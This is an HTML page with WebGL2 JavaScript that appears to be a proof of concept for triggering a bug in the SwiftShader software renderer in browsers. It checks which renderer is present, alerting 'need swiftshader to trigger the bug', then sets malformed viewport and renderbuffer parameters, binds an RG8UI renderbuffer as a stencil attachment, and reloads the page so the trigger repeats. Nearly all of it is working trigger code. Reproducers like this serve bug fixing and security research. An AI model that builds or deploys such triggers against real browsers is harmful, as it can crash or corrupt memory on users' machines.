<html>
<head>
<script id="vshader" type="x-shader/x-vertex">
precision highp float;
attribute vec4 a_position;

void main()
{
    gl_Position = a_position;
}
</script>
<script id="fshader" type="x-shader/x-fragment">
precision mediump float;

void main()
{
    gl_FragColor = vec4(0.0, 1.0, 0.0, 1.0);
}
</script>
</script>
<canvas id="canvas">
<script>
var canvas = document.getElementById('canvas');

var gl = canvas.getContext('webgl2');
var debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
if(debugInfo) {
    var vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
    var renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
    if(!vendor) { vendor = "no vendor"}
    if(!renderer) { renderer = "no renderer" }
    if(renderer.search("SwiftShader")==-1) {
        alert("need swiftshader to trigger the bug");
    }
    document.body.innerHTML = vendor+" / "+renderer+"</br>"+document.body.innerHTML;
}

var vShader = gl.createShader(gl.VERTEX_SHADER);
var vShaderScript = document.getElementById('vshader');
gl.shaderSource(vShader, vShaderScript.text);
gl.compileShader(vShader);

var fShader = gl.createShader(gl.FRAGMENT_SHADER);
var fShaderScript = document.getElementById('fshader');
gl.shaderSource(fShader, fShaderScript.text);
gl.compileShader(fShader);

var program = gl.createProgram();
gl.attachShader(program, vShader);
gl.attachShader(program, fShader);

gl.colorMask(false, true, false, false);
gl.clear(gl.COLOR_BUFFER_BIT | gl.DEPTH_BUFFER_BIT | gl.COLOR_BUFFER_BIT);
gl.viewport(0x64, 128, 65, 65537);

var fb = gl.createFramebuffer();
gl.bindFramebuffer(gl.FRAMEBUFFER, fb);

var rb = gl.createRenderbuffer();
gl.bindRenderbuffer(gl.RENDERBUFFER, rb);
gl.renderbufferStorage(gl.RENDERBUFFER, gl.RG8UI, 1304, 2041);
gl.framebufferRenderbuffer(gl.READ_FRAMEBUFFER, gl.STENCIL_ATTACHMENT, gl.RENDERBUFFER, rb);

var ext = gl.getExtension('EXT_color_buffer_float');
location.href = "";
</script>
</html>